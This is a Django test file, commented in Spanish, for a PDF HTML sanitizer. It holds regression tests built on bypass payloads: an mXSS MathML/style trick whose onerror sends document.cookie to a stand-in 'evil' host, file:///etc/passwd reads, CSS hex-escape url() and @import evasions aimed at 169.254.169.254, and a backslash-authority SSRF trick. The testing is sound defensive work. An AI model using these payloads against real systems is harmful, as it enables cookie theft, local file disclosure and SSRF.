"""`pdf.sanitize_html()`: lo que debe sobrevivir y lo que no.

No ejercita Chromium (eso es `test_api_pdf.py`/verificación manual): esto
prueba únicamente el saneador en sí, con los payloads que en algún momento lo
atravesaron sin tocar.
"""
from django.test import SimpleTestCase

from apps.notes import pdf


class SanitizeHtmlTests(SimpleTestCase):
    def test_script_se_elimina_por_completo(self):
        self.assertEqual(pdf.sanitize_html("<script>alert(1)</script>"), "")

    def test_handler_on_se_quita_del_atributo(self):
        self.assertNotIn("onerror", pdf.sanitize_html('<img src=x onerror="JS">'))

    def test_file_uri_en_src_se_bloquea(self):
        out = pdf.sanitize_html('<img src="file:///etc/passwd">')
        self.assertNotIn("file://", out)

    def test_ruta_absoluta_sin_esquema_se_bloquea(self):
        # Con Chromium en headless (file://<tmp>/in.html), una ruta sin
        # esquema resuelve al mismo file:// que el caso de arriba.
        out = pdf.sanitize_html('<img src="/etc/passwd">')
        self.assertNotIn("/etc/passwd", out)

    def test_ruta_relativa_se_bloquea(self):
        out = pdf.sanitize_html('<img src="../../../etc/passwd">')
        self.assertNotIn("etc/passwd", out)

    def test_file_uri_en_style_se_bloquea(self):
        out = pdf.sanitize_html('<div style="background:url(file:///etc/passwd)">')
        self.assertNotIn("file://", out)

    def test_mxss_math_mglyph_style_no_deja_pasar_markup_crudo(self):
        """Regresión: `<math><mtext><mglyph><style>` hacía que Blink saliera
        del contenido MathML en el `</math>` y parseara lo que seguía como
        HTML real, mientras `html.parser` seguía creyendo que estaba dentro
        del `<style>` y lo entregaba tal cual por `handle_data` — el
        `onerror` sobrevivía intacto, sin pasar por `_clean_attrs`. Verificado
        con Chromium real: el payload leía ficheros del servidor por
        `file://` y los devolvía en el PDF (ver commit de este fix)."""
        payload = ('<math><mtext><mglyph><style></math>'
                   '<img src=x onerror="fetch(\'https://evil/?d=\'+document.cookie)">')
        out = pdf.sanitize_html(payload)
        # El texto puede seguir mencionando "onerror" (es inerte, ver abajo),
        # pero la invariante real es que ni un solo `<`/`>` crudo sobrevive
        # después de `<style>` — sin eso no hay forma de que se vuelva a
        # convertir en una etiqueta nueva, decida Blink lo que decida sobre
        # dónde termina el `<style>`.
        after_style = out.split("<style>", 1)[1]
        self.assertNotIn("<", after_style)
        self.assertNotIn(">", after_style)

    def test_style_con_comillas_legitimas_no_se_rompe(self):
        # Mermaid genera reglas como esta; escapar comillas/& aquí rompía el
        # font-family (un <style> real nunca decodifica entidades).
        css = ('<style>.label{font-family:"trebuchet ms"}'
               '.a{content:"A & B"}</style>')
        self.assertEqual(pdf.sanitize_html(css), css)

    def test_script_autocerrado_no_se_traga_el_resto_del_documento(self):
        """Regresión: `handle_startendtag` subía `_skip_depth` para
        `<script/>` pero, al no llegar nunca un `handle_endtag` (no hay
        cierre real), se quedaba atascado — todo el HTML posterior
        desaparecía en silencio."""
        out = pdf.sanitize_html('<script/><p>esto debe sobrevivir</p>')
        self.assertIn("<p>esto debe sobrevivir</p>", out)

    def test_svg_de_mermaid_sobrevive(self):
        svg = '<svg viewBox="0 0 10 10"><rect width="5" height="5"/></svg>'
        self.assertIn("viewBox", pdf.sanitize_html(svg))

    def test_url_con_escape_hex_css_en_style_tag_se_bloquea(self):
        """Regresión: `\\75rl(...)` es `url(...)` para cualquier navegador
        conforme al estándar (CSS decodifica `\\XX` antes de interpretar el
        nombre de la función), pero `_CSS_URL_RE` buscaba la subcadena
        literal "url(" sin decodificar nada — el saneado nunca detectaba
        que había algo que validar y la URL sobrevivía intacta. Reabría el
        SSRF/LFI que este mismo saneado ya cerraba para la forma sin
        escapar (ver `test_file_uri_en_style_se_bloquea`)."""
        out = pdf.sanitize_html(
            '<style>div{background:\\75rl(file:///etc/passwd)}</style>')
        self.assertNotIn("file://", out)
        self.assertNotIn("etc/passwd", out)

    def test_url_con_escape_hex_css_en_atributo_style_se_bloquea(self):
        out = pdf.sanitize_html(
            '<div style="background:\\75rl(file:///etc/passwd)">')
        self.assertNotIn("file://", out)

    def test_import_con_escape_css_se_bloquea(self):
        out = pdf.sanitize_html(
            '<style>\\40 import "http://169.254.169.254/";</style>')
        self.assertNotIn("169.254.169.254", out)

    def test_url_http_valida_con_escape_css_sobrevive(self):
        # El escape no es en sí mismo el problema: una URL que ya pasaría
        # sin escapar debe seguir sobreviviendo (decodificada).
        out = pdf.sanitize_html(
            '<style>div{background:\\75rl(https://example.com/a.png)}</style>')
        self.assertIn("https://example.com/a.png", out)

    def test_barra_invertida_en_autoridad_disfraza_el_host_para_urlsplit(self):
        """Regresión: `urlsplit` (RFC 3986) no le da ningún significado
        especial a `\\` y lo deja dentro del netloc, pero el parser WHATWG
        URL que usa Chromium para la petición real trata `\\` igual que `/`
        como terminador de la autoridad en esquemas especiales (http/https
        entre ellos). `http://127.0.0.1:9999\\@example.com/x` parece apuntar
        a "example.com" (público, pasaría el chequeo) para `_is_safe_uri`,
        pero Chromium conecta de verdad a 127.0.0.1:9999 — confirmado en vivo
        con Chromium real, ver el commit de este fix."""
        self.assertFalse(
            pdf._is_safe_uri('http://127.0.0.1:9999\\@example.com/x'))
        self.assertFalse(pdf._is_safe_uri(
            'http://169.254.169.254\\@example.com/latest/meta-data/'))
        out = pdf.sanitize_html(
            '<img src="http://127.0.0.1:9999\\@example.com/x">')
        self.assertNotIn("127.0.0.1", out)

    def test_barra_invertida_en_url_publica_legitima_no_se_rompe(self):
        # La barra invertida no es en sí misma el problema: una URL pública
        # normal (sin intención de disfrazar el host) debe seguir validando
        # igual tanto si aparece antes como después de normalizar `\` a `/`.
        self.assertTrue(pdf._is_safe_uri('https://example.com/a.png'))
